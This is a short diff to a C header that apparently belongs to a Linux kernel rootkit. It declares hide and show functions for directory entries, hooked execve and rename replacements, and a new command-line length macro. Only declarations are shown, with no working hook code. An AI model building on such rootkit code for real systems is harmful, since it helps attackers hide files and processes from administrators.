@@ -30,6 +30,10 @@
 
 /* hide/show directory entries */
 
+#undef HIDE_CMD_LINE_MAX
+
+#define HIDE_CMD_LINE_MAX (PATH_MAX << 4)
+
 typedef struct linux_dirent{
     unsigned long  d_ino;     /* Inode number */
     unsigned long  d_off;     /* Offset to next linux_dirent */
@@ -46,7 +50,7 @@ typedef struct linux_dirent{
 } linux_dirent;
 
 /* hide a directory entry */
-int hide(const char __user *path);
+int hide(const char __user *cmd);
 
 int hide_exit(void);
 
@@ -58,7 +62,7 @@ static asmlinkage int new_execve(const char *pathname, char *const argv[], char 
 static asmlinkage int new_rename(const char* pathname, const char* action);
 
 /* show a directory entry */
-int show(const char __user *path);
+int show(const char __user *cmd);
 
 #endif
 
